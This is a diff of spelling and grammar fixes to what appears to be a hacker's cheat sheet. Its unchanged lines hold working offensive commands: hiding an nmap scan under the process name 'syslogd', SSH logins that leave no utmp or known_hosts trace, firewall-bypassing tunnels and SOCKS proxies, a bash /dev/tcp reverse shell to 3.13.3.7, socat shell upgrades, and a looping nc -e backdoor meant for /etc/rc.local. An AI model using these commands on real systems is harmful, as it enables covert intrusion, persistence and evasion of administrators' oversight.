@@ -87,7 +87,7 @@ $  id
 $ exec -a syslogd nmap -T0 10.0.2.1/24
 ```
 
-Alternative if there is no Bash:
+Alternatively if there is no Bash:
 ```
 $ cp `which nmap` syslogd
 $ PATH=.:$PATH syslogd -T0 10.0.2.1/24
@@ -111,7 +111,7 @@ Note: There is a gdb variant as well. Anyone?
 ```
 $ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
 ```
-This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
+This will not add your user to the */var/log/utmp* file and you won't show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
 
 <a id="sto-anchor"></a>
 **2.ii SSH tunnel OUT**
@@ -120,7 +120,7 @@ We use this all the time to circumvent local firewalls and IP filtering:
 ```
 $ ssh -g -L31337:1.2.3.4:80 user@host.org
 ```
-You or anyone else can now connect to your computer on port 31337 and gets tunneled to 1.2.3.4 port 80 and appearing with the source IP of 'host.org'.
+You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'host.org'.
 
 <a id="sti-anchor"></a>
 **2.iii SSH tunnel IN**
@@ -142,15 +142,15 @@ $ ssh -D 1080 user@host.org
 Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through *host.org* and will appear with the source IP of *host.org*.
 
 <a id="ssi-anchor"></a>
-**2.iv SSH socks4/5 IN**
+**2.v SSH socks4/5 IN**
 
-This is the reverse to the above example. It give others access to your *local* network or let others use your compute as a tunnel end-point.
+This is the reverse of the above example. It give others access to your *local* network or let others use your computer as a tunnel end-point.
 
 ```
 $ ssh -g -R 1080 user@host.org
 ```
 
-The others configuring host.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computers on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network.
+The others configuring host.org:1080 as their SOCKS4/5 proxy. They can now connect to *any* computer on *any port* that your computer has access to. This includes access to computers behind your firewall that are on your local network.
 
 ---
 <a id="network-anchor"></a>
@@ -327,7 +327,7 @@ Start netcat to listen on port 1524 on your system:
 $ nc -nvlp 1524
 ```
 
-On the remote system. This Bash will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
+On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```
 $ bash -i 2>&1 >&/dev/tcp/3.13.3.7/1524 0>&1
 ```
@@ -405,7 +405,7 @@ $ python -c 'import pty; pty.spawn("/bin/bash")'
 <a id="rsup2-anchor"></a>
 **5.ii.b. Upgrade a reverse shell to a fully interactive shell**
 
-...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorfull interactive shell:
+...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:
 
 ```
 # On the target host spwan a PTY using any of the above examples:
@@ -442,7 +442,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 <a id="bdrs-anchor"></a>
 **6.i. Background reverse shell**
 
-A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinately). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. Add to */etc/rc.local* if required...
+A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. Add to */etc/rc.local* if required...
 
 ```
 $ (while :; do nc -e /bin/bash -vn 3.13.3.7 1524; sleep 3600; done ) &>/dev/null &
